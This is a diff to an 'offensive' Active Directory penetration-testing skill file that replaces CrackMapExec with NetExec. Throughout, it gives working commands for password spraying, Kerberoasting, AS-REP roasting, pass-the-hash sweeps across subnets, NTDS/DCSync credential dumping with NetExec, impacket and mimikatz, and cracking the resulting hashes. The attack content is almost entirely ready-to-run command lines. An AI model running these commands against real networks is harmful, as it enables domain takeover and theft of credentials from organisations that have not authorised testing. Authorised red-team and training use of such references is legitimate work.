@@ -4,7 +4,7 @@ description: Active Directory penetration testing — BloodHound enumeration, Ke
 metadata:
   type: offensive
   phase: exploitation
-  tools: impacket, mimikatz, bloodhound, rubeus, crackmapexec, powerview, responder, kerbrute
+  tools: impacket, mimikatz, bloodhound, rubeus, netexec, powerview, responder, kerbrute
   mitre: TA0008
 ---
 
@@ -27,7 +27,7 @@ metadata:
 | Impacket | Python AD attack suite |
 | Mimikatz | Credential extraction |
 | Rubeus | Kerberos attacks |
-| CrackMapExec | Network exploitation |
+| NetExec (`nxc`) | Network exploitation — see [`skills/netexec/SKILL.md`](../netexec/SKILL.md) for the canonical reference |
 | PowerView | AD enumeration |
 | Responder | LLMNR/NBT-NS poisoning |
 | Kerbrute | User enumeration & password spray |
@@ -277,22 +277,24 @@ Invoke-UserHunter -Stealth
 # Kerbrute
 ./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123
 
-# CrackMapExec
-crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
+# NetExec — see netexec/SKILL.md "Password Spraying" for the full set of flags
+nxc smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
+nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --jitter 2-5 --continue-on-success
 ```
 
 ### Kerberoasting
 
 ```bash
-# Find SPNs
-GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
+# NetExec built-in — see netexec/SKILL.md "Kerberoasting"
+nxc ldap dc.domain.local -u user -p pass --kerberoasting hashes.txt
 
-# Request TGS tickets
+# Impacket
+GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt
 
 # Crack tickets
-hashcat -m 13100 tgs.txt rockyou.txt
-# Or: john --wordlist=rockyou.txt --format=krb5tgs tgs.txt
+hashcat -m 13100 hashes.txt rockyou.txt
+# Or: john --wordlist=rockyou.txt --format=krb5tgs hashes.txt
 
 # Rubeus (Windows)
 Rubeus.exe kerberoast /outfile:hashes.txt
@@ -306,11 +308,14 @@ Rubeus.exe kerberoast /outfile:hashes.txt /creduser:DOMAIN\user /credpassword:pa
 Get-DomainUser -PreauthNotRequired
 # Or BloodHound: MATCH (u:User {dontreqpreauth:true}) RETURN u
 
-# Request AS-REP
+# NetExec built-in — works with just a userlist, no creds required
+nxc ldap dc.domain.local -u users.txt -p '' --asreproast asrep.txt
+
+# Impacket
 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10 -no-pass
 
 # Crack
-hashcat -m 18200 asrep_hashes.txt rockyou.txt
+hashcat -m 18200 asrep.txt rockyou.txt
 
 # Rubeus
 Rubeus.exe asreproast /outfile:asrep.txt
@@ -346,7 +351,7 @@ ntlmrelayx.py -t http://adcs.domain.local/certsrv/certfnsh.asp -smb2support
 ### SMB Signing Check
 
 ```bash
-crackmapexec smb 10.10.10.0/24 --gen-relay-list relayable.txt
+nxc smb 10.10.10.0/24 --gen-relay-list relayable.txt
 # Or check individually:
 nmap -p445 --script smb-security-mode 10.10.10.10
 ```
@@ -356,14 +361,19 @@ nmap -p445 --script smb-security-mode 10.10.10.10
 ### Pass-the-Hash
 
 ```bash
-# CrackMapExec
-crackmapexec smb 10.10.10.10 -u user -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH -x "whoami"
+# NetExec — preferred for cmd exec + sweep validation across hosts
+nxc smb 10.10.10.10 -u user -H NTLM_HASH -x 'whoami'
+nxc smb 10.10.10.0/24 -u user -H NTLM_HASH         # domain-wide PtH sweep
+nxc smb 10.10.10.0/24 -u user -H NTLM_HASH --local-auth   # local SAM PtH
 
-# Impacket
+# Impacket — interactive shell
 psexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
 wmiexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
 smbexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
 ```
+
+> See netexec/SKILL.md "Authentication" for the full set of PtH variants
+> (paired -u/-H files, --local-auth, --no-bruteforce, Kerberos `-k`).
 
 ### Pass-the-Ticket
 
@@ -384,14 +394,21 @@ psexec.py domain.local/user@10.10.10.10 -k -no-pass
 
 ```bash
 # Requires: Replicating Directory Changes rights
+
+# Impacket — full NTDS via DRSUAPI replication
 impacket-secretsdump -just-dc domain.local/user:password@10.10.10.10
 
-# Mimikatz
+# NetExec — drops the dump in ~/.nxc/logs/ntds/<HOST>_<IP>_<TS>.ntds.
+# See netexec/SKILL.md "NTDS.dit (Domain Controller)" for the full options
+# (--ntds vss, --user filter, --enabled), then chain into the post-DCSync
+# PtH validation sweep documented in the same skill.
+nxc smb 10.10.10.10 -u user -p password --ntds
+nxc smb 10.10.10.10 -u user -p password --ntds --user Administrator
+nxc smb 10.10.10.10 -u user -p password --ntds vss     # VSS fallback method
+
+# Mimikatz (single-account DCSync)
 mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
 mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
-
-# CrackMapExec
-crackmapexec smb 10.10.10.10 -u user -p password --ntds drsuapi
 ```
 
 ## Kerberos Ticket Attacks
